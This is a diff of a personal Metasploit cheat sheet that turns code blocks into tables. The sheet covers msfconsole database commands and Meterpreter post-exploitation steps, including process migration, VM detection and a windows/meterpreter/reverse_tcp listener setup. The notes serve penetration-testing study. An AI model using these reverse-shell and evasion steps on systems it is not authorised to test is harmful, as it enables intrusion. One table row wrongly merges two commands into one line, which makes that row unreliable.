@@ -1,63 +1,34 @@
 # Metasploit Notes
 
 ### Basics
-----
-```console
-# Search metasploit's db for exploits
-search <keyword>
 
-# Get context-specific variable
-get <var>
+---
 
-# Set global variable
-setg <var>
+| Commmand                   | Description                         |
+| -------------------------- | ----------------------------------- |
+| `search <keyword>`         | Search metasploit's db for exploits |
+| `get <var>`                | Get context-specific variable       |
+| `setg <var>`               | Set global variable                 |
+| `unset <var>`              | Unset context-specific variable     |
+| `db_nmap <options> <host>` | store nmap scan in database         |
+| `services`                 | list open services on target        |
+| `hosts`                    | list host info in database          |
+| `vulns`                    | list vulns                          |
+| `edit`                     | edit exploit source code            |
 
-# Unset context-specific variable
-unset <var>
+### meterpreter (windows)
 
-# store nmap scan in database
-db_nmap <options> <host>
-
-# list open services on target
-services
-
-# list host info in database
-hosts
-
-# list vulns
-vulns
-
-# edit exploit source code
-edit
-```
-```meterpreter (windows)
-# migrate to another process
-migrate <PID>
-
-# check if target is a VM
-run post/windows/gather/checkvm
-
-# setup msfvenom reverse shell payload listener
-# don't forget to set LHOST and LPORT	
-use exploit/multi/handler
-
-# setup windows meterpreter reverse shell
-set payload windows/meterpreter/reverse_tcp
-run
-```
+| Commmand | Description |
+| --- | --- |
+| `migrate <PID>` | migrate to another process |
+| `run post/windows/gather/checkvm` | check if target is a VM |
+| `use exploit/multi/handler` | setup msfvenom reverse shell payload listener, don't forget to set LHOST and LPORT |
+| `set payload windows/meterpreter/reverse_tcp run` | setup windows meterpreter reverse shell |
 
 ### Project Management
-```bash
-msfdb init                  # create metasploit database
-```
-```msfconsole
-db_status   # connect to db
-workspace   # setup workspace
-```
 
-## Meterpreter
-`getpid`: get meterpreter shell pid
-
-## Useful Modules
-`exploit/multi/handler/reverse_tcp`
-
+| Commmand     | Description                |
+| ------------ | -------------------------- |
+| `msfdb init` | create metasploit database |
+| `db_status`  | connect to db              |
+| `workspace`  | setup workspace            |
